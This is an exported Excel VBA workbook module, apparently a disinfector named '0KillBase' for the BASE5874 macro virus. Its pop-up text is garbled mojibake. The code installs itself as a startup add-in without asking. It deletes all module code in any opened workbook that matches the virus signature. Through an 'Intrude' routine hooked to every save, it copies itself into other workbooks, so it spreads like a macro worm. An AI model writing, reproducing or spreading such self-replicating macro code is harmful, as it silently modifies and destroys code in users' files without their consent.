   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private WithEvents mapp As Application
   Attribute mapp.VB_VarHelpID = -1

   Private Const cstrKillEngine      As String = "0KILLBASE.XLS"

   Private Sub Workbook_Open()
   Dim BaseName As String
   Dim myName As String
   Dim wbkKillEngine As Workbook
   Dim strKillEngine As String

   BaseName = Application.StartupPath + "\BASE5874.XLS"

   If Len(Dir(BaseName)) <> 0 Then
       Set x = Application.Workbooks.Open(BaseName)
       x.Close
       Kill BaseName
       MsgBox "µo²{<BASE5874>¯f¬r,¤w²M°£!!", vbInformation, "¨Ó¦Û0KillBaseªº´£¥Ü"
   End If
   strKillEngine = UCase$(Application.StartupPath + "\" + cstrKillEngine)

   If UCase$(Me.FullName) = strKillEngine Then
       If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
       Set mapp = Application
   ElseIf Len(Dir(strKillEngine)) = 0 Then
       Application.ScreenUpdating = False
       Set wbkKillEngine = Workbooks.Add
       wbkKillEngine.IsAddin = True
       Intrude wbkKillEngine
       wbkKillEngine.SaveAs strKillEngine, xlAddIn
       wbkKillEngine.Close
       Application.ScreenUpdating = True
   End If

   End Sub

   Private Sub mapp_WorkbookOpen(ByVal Wb As Workbook)
     Dim cmdTarget As Object

     On Error Resume Next
     Set cmdTarget = Wb.VBProject.VBComponents("ThisWorkbook").CodeModule
     If cmdTarget.Find("Private Const cstrEngine      As String =", 1, 1, 20, 41) Then
       cmdTarget.DeleteLines 1, cmdTarget.CountOfLines
       Wb.Save
       MsgBox "µo²{<BASE5874>¯f¬r,¤w²M°£!!", vbInformation, "¨Ó¦Û0KillBaseªº´£¥Ü"
     End If

   End Sub
   Private Function Intrude(wbkTarget As Workbook) As Boolean
     Dim cmdSource As Object
     Dim cmdTarget As Object
     On Error Resume Next
     Intrude = False
     Set cmdSource = Me.VBProject.VBComponents("ThisWorkbook").CodeModule
     Set cmdTarget = wbkTarget.VBProject.VBComponents("ThisWorkbook").CodeModule
     If cmdTarget.CountOfLines <= 2 Then
       cmdTarget.DeleteLines 1, cmdSource.CountOfLines
       cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
       Intrude = True
     End If
   End Function
   Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
     On Error Resume Next
     Intrude Wb
   End Sub
